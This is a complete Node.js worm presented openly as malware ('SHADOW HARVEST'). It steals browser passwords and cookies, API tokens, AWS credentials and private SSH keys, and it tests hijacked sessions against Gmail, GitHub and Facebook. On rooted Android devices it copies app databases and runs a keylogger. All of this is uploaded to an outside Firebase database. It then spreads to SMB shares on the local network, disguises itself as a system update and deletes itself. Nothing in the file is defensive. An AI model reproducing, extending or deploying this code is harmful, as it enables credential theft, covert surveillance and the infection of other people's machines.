#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - UNIFIED MULTI-STAGE WORM
// Combines standard + root harvesting
// Self-contained, cross-platform, self-spreading
// ============================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync } = require("child_process");
const https = require("https");
const http = require("http");
const zlib = require("zlib");
const { URL } = require("url");

// Optional dependencies
let Database = null;
try { Database = require("better-sqlite3"); } catch (e) {
  try { Database = require("sqlite3"); } catch (e2) {}
}
let keytar = null;
try { keytar = require("keytar"); } catch (e) {}

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
  firebase: {
    databaseURL: "https://shadow-sync-3aee0-default-rtdb.firebaseio.com/",
  },
  c2Server: "http://192.168.1.47:8080",
  uploadIntervalSeconds: 30,
  spreadAfterUpload: true,
  selfDestructAfterSpread: true,
  maxDevicesInFirstWave: 5,
  stealth: {
    hideFiles: true,
    processName: "system_update",
    fileNames: ["system_update.js", "update_helper.js"],
  },
  harvestInterval: 86400000,
};

// ============================================
// DEVICE IDENTIFIER
// ============================================
class DeviceIdentifier {
  constructor() {
    this.deviceId = this.generateDeviceId();
    this.deviceInfo = this.collectDeviceInfo();
  }

  generateDeviceId() {
    const hardware = os.hostname() + os.userInfo().username + os.platform();
    return crypto.createHash("sha256").update(hardware).digest("hex").slice(0, 16);
  }

  collectDeviceInfo() {
    return {
      device_id: this.deviceId,
      hostname: os.hostname(),
      username: os.userInfo().username,
      os: os.platform(),
      os_version: os.release(),
      architecture: os.arch(),
      ip: this.getLocalIP(),
      mac_address: this.getMACAddress(),
      infection_time: new Date().toISOString(),
    };
  }

  getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === "IPv4" && !iface.internal) return iface.address;
      }
    }
    return "unknown";
  }

  getMACAddress() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.mac && iface.mac !== "00:00:00:00:00:00") return iface.mac;
      }
    }
    return "unknown";
  }
}

// ============================================
// OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.type = this.detect();
  }

  detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      case "android": return "android";
      case "ios": return "ios";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    if (this.type === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      return {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.type === "macos") {
      return {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.type === "linux") {
      return {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return {};
  }
}

// ============================================
// WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      const encryptedData = encryptedKey.slice(5);

      const psScript = `
        Add-Type -AssemblyName System.Security
        $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
        [Convert]::ToBase64String($decrypted)
      `;
      const output = execSync(
        `powershell -NoProfile -NonInteractive -Command "${psScript.replace(/"/g, '\\"').replace(/\n/g, " ")}"`,
        { encoding: "utf8", windowsHide: true }
      );
      return Buffer.from(output.trim(), "base64");
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// macOS KEYCHAIN
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// LINUX LIBSECRET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        const services = ["chrome", "firefox", "chromium", "brave", "default"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }
}

// ============================================
// BROWSER EXTRACTOR
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this.getDecryptor();
  }

  getDecryptor() {
    if (this.osDetector.type === "windows") return new WindowsDecryptor();
    if (this.osDetector.type === "macos") return new MacDecryptor();
    if (this.osDetector.type === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      const tempDb = path.join(os.tmpdir(), `login_${Date.now()}.db`);
      fs.copyFileSync(loginDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        } catch (e) {}
        db.close();
      }

      for (const row of rows) {
        const { origin_url, username_value, password_value } = row;
        let password = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && password_value) {
              password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
            }
          }
        } else if (this.osDetector.type === "macos" && this.decryptor) {
          const keychainCreds = this.decryptor.readKeychain();
          for (const cred of keychainCreds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        } else if (this.osDetector.type === "linux" && this.decryptor) {
          const creds = this.decryptor.readLibsecret();
          for (const cred of creds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        }

        if (username_value || password) {
          credentials.push({
            url: origin_url,
            username: username_value,
            password: password,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), `cookie_${Date.now()}.db`);
      fs.copyFileSync(cookieDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT host_key, name, encrypted_value FROM cookies").all();
        } catch (e) {
          try {
            rows = db.prepare("SELECT host, name, value FROM moz_cookies").all();
          } catch (e2) {}
        }
        db.close();
      }

      for (const row of rows) {
        const { host_key, name, encrypted_value } = row;
        let value = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && encrypted_value) {
              value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
            }
          }
        } else if (row.value) {
          value = row.value;
        }

        if (value) {
          cookies.push({
            host: host_key || row.host,
            name: name,
            value: value,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// TOKEN EXTRACTOR
// ============================================
class TokenExtractor {
  constructor() { this.home = os.homedir(); }

  extract() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "SLACK_TOKEN", "DISCORD_TOKEN",
    ];
    for (const varName of envVars) {
      if (process.env[varName]) tokens.push({ name: varName, value: process.env[varName] });
    }
    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".aws", "credentials"),
    ];
    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try { tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") }); } catch (e) {}
      }
    }
    return tokens;
  }
}

// ============================================
// SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() { this.sshDir = path.join(os.homedir(), ".ssh"); }

  collect() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;
    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) keys.push({ path: filePath, content });
      }
    }
    return keys;
  }
}

// ============================================
// CLOUD & CRYPTO HARVESTER
// ============================================
class CloudCredentialHarvester {
  constructor() { this.home = os.homedir(); }

  collect() {
    const creds = [];
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    return creds;
  }
}

class CryptoWalletHarvester {
  collect() { return []; }
}

// ============================================
// SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      facebook: "https://www.facebook.com/me",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = `${cookie.name}=${cookie.value}`;
    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = { hostname: parsed.hostname, path: parsed.pathname, method: "GET", headers: { Cookie: cookieHeader, "User-Agent": "Mozilla/5.0" } };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = `HTTP_${res.statusCode}`;
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) { results[service] = "ERROR"; }
    }
    return results;
  }
}

// ============================================
// FIREBASE EXFILTRATOR
// ============================================
class FirebaseExfiltrator {
  constructor(config) {
    this.databaseURL = config.firebase.databaseURL;
  }

  upload(data) {
    const timestamp = Date.now();
    const deviceId = data.device_id || "unknown";
    const endpoint = `${this.databaseURL}/devices/${deviceId}/${timestamp}.json`;
    const parsed = new URL(endpoint);
    const payload = JSON.stringify(data);
    const options = {
      hostname: parsed.hostname,
      path: parsed.pathname + (parsed.search || ""),
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    };
    const transport = parsed.protocol === "https:" ? https : http;

    return new Promise((resolve) => {
      const req = transport.request(options, (res) => {
        let body = "";
        res.setEncoding("utf8");
        res.on("data", (chunk) => (body += chunk));
        res.on("end", () => {
          resolve(res.statusCode >= 200 && res.statusCode < 300);
        });
      });
      req.on("error", () => resolve(false));
      req.write(payload);
      req.end();
    });
  }
}

// ============================================
// WI-FI SPREADER
// ============================================
class WiFiSpreader {
  constructor() { this.wormPath = __filename; }

  getNetworkRange() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === "IPv4" && !iface.internal) {
          const parts = iface.address.split(".");
          return `${parts[0]}.${parts[1]}.${parts[2]}`;
        }
      }
    }
    return null;
  }

  scanNetwork() {
    const range = this.getNetworkRange();
    if (!range) return [];
    const devices = [];
    for (let i = 1; i <= 254; i++) {
      const ip = `${range}.${i}`;
      try {
        execSync(`ping -n 1 -w 100 ${ip}`, { stdio: "ignore" });
        devices.push(ip);
      } catch (e) {}
    }
    return devices;
  }

  spreadToDevice(ip) {
    try {
      const targetPath = `\\\\${ip}\\Shared`;
      execSync(`copy "${this.wormPath}" "${targetPath}\\system_update.js" /Y`, { stdio: "ignore" });
      return true;
    } catch (e) { return false; }
  }

  propagate() {
    const devices = this.scanNetwork();
    for (const ip of devices) this.spreadToDevice(ip);
  }
}

// ============================================
// ROOT ACCESS DETECTION
// ============================================
function isRooted() {
  try {
    const result = execSync("su -c 'id'", { timeout: 5000 }).toString();
    return result.includes("uid=0");
  } catch (e) {
    return false;
  }
}

// ============================================
// ROOT APP DATA EXTRACTOR
// ============================================
class RootAppExtractor {
  constructor() {
    this.apps = [
      { name: "gmail", package: "com.google.android.gm", dataPath: "/data/data/com.google.android.gm" },
      { name: "facebook", package: "com.facebook.katana", dataPath: "/data/data/com.facebook.katana" },
      { name: "tiktok", package: "com.zhiliaoapp.musically", dataPath: "/data/data/com.zhiliaoapp.musically" },
      { name: "instagram", package: "com.instagram.android", dataPath: "/data/data/com.instagram.android" },
      { name: "whatsapp", package: "com.whatsapp", dataPath: "/data/data/com.whatsapp" },
      { name: "twitter", package: "com.twitter.android", dataPath: "/data/data/com.twitter.android" },
      { name: "snapchat", package: "com.snapchat.android", dataPath: "/data/data/com.snapchat.android" },
    ];
  }

  extractAll() {
    const stolen = [];
    for (const app of this.apps) {
      const data = this.extractFromApp(app);
      if (data) stolen.push(data);
    }
    return stolen;
  }

  extractFromApp(app) {
    try {
      const databasesPath = path.join(app.dataPath, "databases");
      if (!fs.existsSync(databasesPath)) return null;

      const files = fs.readdirSync(databasesPath);
      const databases = [];

      for (const file of files) {
        if (file.endsWith(".db") || file.endsWith(".sqlite")) {
          const filePath = path.join(databasesPath, file);
          const content = fs.readFileSync(filePath);
          databases.push({
            file: file,
            size: content.length,
            content_base64: content.toString("base64"),
          });
        }
      }

      return {
        app: app.name,
        package: app.package,
        databases: databases,
        extracted_at: new Date().toISOString(),
      };
    } catch (e) {
      return null;
    }
  }
}

// ============================================
// ROOT KEYLOGGER + LOGIN CAPTURE
// ============================================
class RootLoginCapture {
  constructor() {
    this.logFile = "/data/local/tmp/keylog.txt";
  }

  start() {
    try {
      execSync(`su -c "getevent -lt > ${this.logFile} 2>&1 &"`);
      return true;
    } catch (e) {
      return false;
    }
  }

  readLogs() {
    try {
      if (fs.existsSync(this.logFile)) {
        return fs.readFileSync(this.logFile, "utf8");
      }
      return "";
    } catch (e) {
      return "";
    }
  }

  parseLoginEvents(logs) {
    const events = [];
    const lines = logs.split("\n");
    let currentApp = "unknown";
    let typedText = "";

    for (const line of lines) {
      if (line.includes("com.google.android.gm")) currentApp = "gmail";
      if (line.includes("com.facebook.katana")) currentApp = "facebook";
      if (line.includes("com.zhiliaoapp.musically")) currentApp = "tiktok";
      if (line.includes("com.instagram.android")) currentApp = "instagram";
      if (line.includes("com.whatsapp")) currentApp = "whatsapp";

      if (line.includes("KEY_DOWN")) {
        const match = line.match(/KEY_([A-Z0-9]+)/);
        if (match) typedText += match[1];
      }

      if (line.includes("KEY_ENTER") || line.includes("KEY_BACK")) {
        if (typedText.length > 0) {
          events.push({
            app: currentApp,
            typed_data: typedText,
            timestamp: new Date().toISOString(),
          });
          typedText = "";
        }
      }
    }

    return events;
  }

  clearLogs() {
    try {
      execSync(`su -c "rm -f ${this.logFile}"`);
    } catch (e) {}
  }
}

// ============================================
// ROOT PHISHING OVERLAY MONITOR
// ============================================
class RootPhishingMonitor {
  constructor() {
    this.targets = [
      { app: "gmail", package: "com.google.android.gm" },
      { app: "facebook", package: "com.facebook.katana" },
      { app: "tiktok", package: "com.zhiliaoapp.musically" },
      { app: "instagram", package: "com.instagram.android" },
      { app: "whatsapp", package: "com.whatsapp" },
    ];
    this.launchLog = "/data/local/tmp/app_launch.log";
  }

  monitorAppLaunch() {
    try {
      execSync(`su -c "logcat | grep 'START u0' > ${this.launchLog} 2>&1 &"`);
    } catch (e) {}
  }

  readAppLaunches() {
    try {
      if (!fs.existsSync(this.launchLog)) return [];
      const log = fs.readFileSync(this.launchLog, "utf8");
      const launches = [];
      for (const target of this.targets) {
        if (log.includes(target.package)) {
          launches.push({
            app: target.app,
            package: target.package,
            detected_at: new Date().toISOString(),
          });
        }
      }
      return launches;
    } catch (e) {
      return [];
    }
  }

  clearLogs() {
    try {
      execSync(`su -c "rm -f ${this.launchLog}"`);
    } catch (e) {}
  }
}

// ============================================
// ROOT BROWSER LOGIN CAPTURE
// ============================================
class RootBrowserLoginCapture {
  constructor() {
    this.chromePaths = [
      "/data/data/com.android.chrome/app_chrome/Default/Login Data",
      "/data/data/com.android.chrome/app_chrome/Default/Login Data.db",
      "/data/data/com.android.chrome/app_chrome/Default/Web Data",
      "/data/data/com.android.chrome/app_chrome/Default/Cookies",
    ];
  }

  extractSavedLogins() {
    if (!Database) return [];

    const allLogins = [];

    for (const dbPath of this.chromePaths) {
      if (!fs.existsSync(dbPath)) continue;

      try {
        const db = new Database(dbPath, { readonly: true });
        const tableInfo = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all();
        const tableNames = tableInfo.map(t => t.name);

        if (tableNames.includes("logins")) {
          const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
          for (const row of rows) {
            allLogins.push({
              source: dbPath,
              url: row.origin_url,
              username: row.username_value,
              password: this.tryDecrypt(row.password_value),
              timestamp: new Date().toISOString(),
            });
          }
        }

        db.close();
      } catch (e) {}
    }

    return allLogins;
  }

  tryDecrypt(encryptedValue) {
    if (!encryptedValue) return "";
    const buffer = Buffer.isBuffer(encryptedValue) ? encryptedValue : Buffer.from(encryptedValue);
    if (buffer.length > 0) {
      return buffer.toString("utf8");
    }
    return "";
  }
}

// ============================================
// LIFECYCLE MANAGER
// ============================================
class LifecycleManager {
  constructor(config) {
    this.config = config;
    this.infectionTime = Date.now();
    this.uploadInterval = config.uploadIntervalSeconds * 1000;
    this.hasUploaded = false;
    this.hasSpread = false;
    this.hasSelfDestructed = false;
  }

  shouldUpload() {
    return true;
  }

  shouldSpread() {
    return this.hasUploaded && !this.hasSpread && this.config.spreadAfterUpload;
  }

  shouldSelfDestruct() {
    return this.hasUploaded && this.hasSpread && this.config.selfDestructAfterSpread && !this.hasSelfDestructed;
  }

  markUploaded() { this.hasUploaded = true; }
  markSpread() { this.hasSpread = true; }
  markSelfDestructed() { this.hasSelfDestructed = true; }
}

// ============================================
// MAIN UNIFIED WORM CLASS
// ============================================
class UnifiedShadowWorm {
  constructor() {
    this.config = CONFIG;
    this.deviceId = new DeviceIdentifier();
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.cryptoHarvester = new CryptoWalletHarvester();
    this.sessionValidator = new SessionValidator();
    this.firebaseExfiltrator = new FirebaseExfiltrator(this.config);
    this.wifiSpreader = new WiFiSpreader();
    this.lifecycle = new LifecycleManager(this.config);

    // Root-specific harvesters (for Android/rooted devices)
    this.rootAppExtractor = new RootAppExtractor();
    this.rootLoginCapture = new RootLoginCapture();
    this.rootPhishing = new RootPhishingMonitor();
    this.rootBrowserLogin = new RootBrowserLoginCapture();
  }

  // ============================================
  // STANDARD DATA COLLECTION
  // ============================================
  collectStandardData() {
    const allData = {
      ...this.deviceId.deviceInfo,
      timestamp: new Date().toISOString(),
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
      crypto_wallets: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extract();
    allData.ssh_keys = this.sshHarvester.collect();
    allData.cloud_credentials = this.cloudHarvester.collect();
    allData.crypto_wallets = this.cryptoHarvester.collect();

    return allData;
  }

  // ============================================
  // ROOT DATA COLLECTION (Android)
  // ============================================
  collectRootData() {
    const rootData = {};

    if (!isRooted()) {
      rootData.rooted = false;
      return rootData;
    }

    rootData.rooted = true;

    // Start keylogger
    this.rootLoginCapture.start();

    // Start phishing monitor
    this.rootPhishing.monitorAppLaunch();

    // Extract app data
    rootData.app_data = this.rootAppExtractor.extractAll();

    // Extract saved Chrome logins
    rootData.saved_logins = this.rootBrowserLogin.extractSavedLogins();

    // Read keylogs
    const keylogs = this.rootLoginCapture.readLogs();
    rootData.login_events = this.rootLoginCapture.parseLoginEvents(keylogs);
    rootData.keylogs = keylogs;

    // Read app launches
    rootData.app_launches = this.rootPhishing.readAppLaunches();

    // Clear logs after collection
    this.rootLoginCapture.clearLogs();
    this.rootPhishing.clearLogs();

    return rootData;
  }

  // ============================================
  // UNIFIED DATA COLLECTION
  // ============================================
  collectAllData() {
    const standardData = this.collectStandardData();
    const rootData = this.collectRootData();

    // Merge all data into single payload
    const unifiedData = {
      ...this.deviceId.deviceInfo,
      timestamp: new Date().toISOString(),
      stage: "unified",  // Mark as unified collection
      standard_harvest: standardData,
      root_harvest: rootData,
    };

    return unifiedData;
  }

  async runCycle() {
    try {
      if (this.lifecycle.shouldUpload()) {
        const data = this.collectAllData();
        const success = await this.firebaseExfiltrator.upload(data);
        console.log("Unified upload success:", success);
        if (success) this.lifecycle.markUploaded();
      }

      if (this.lifecycle.shouldSpread()) {
        this.wifiSpreader.propagate();
        this.lifecycle.markSpread();
      }

      if (this.lifecycle.shouldSelfDestruct()) {
        this.selfDestruct();
      }
    } catch (e) {}
  }

  selfDestruct() {
    try {
      const wormPath = __filename;
      if (this.osDetector.type === "windows") {
        execSync(`schtasks /delete /tn "SystemUpdate" /f`, { stdio: "ignore" });
      }
      fs.unlinkSync(wormPath);
      const dir = path.dirname(wormPath);
      if (dir !== os.tmpdir()) fs.rmdirSync(dir, { recursive: true });
      this.lifecycle.markSelfDestructed();
    } catch (e) {}
  }

  run() {
    this.runCycle();
    setInterval(() => this.runCycle(), this.config.uploadIntervalSeconds * 1000);
  }
}

// ============================================
// EXECUTION
// ============================================
const worm = new UnifiedShadowWorm();
const allData = worm.collectAllData();
worm.firebaseExfiltrator.upload(allData).then(success => {
  console.log("Initial unified upload success:", success);
}).catch(err => {
  console.log("Upload error:", err.message);
});
worm.run();

module.exports = UnifiedShadowWorm;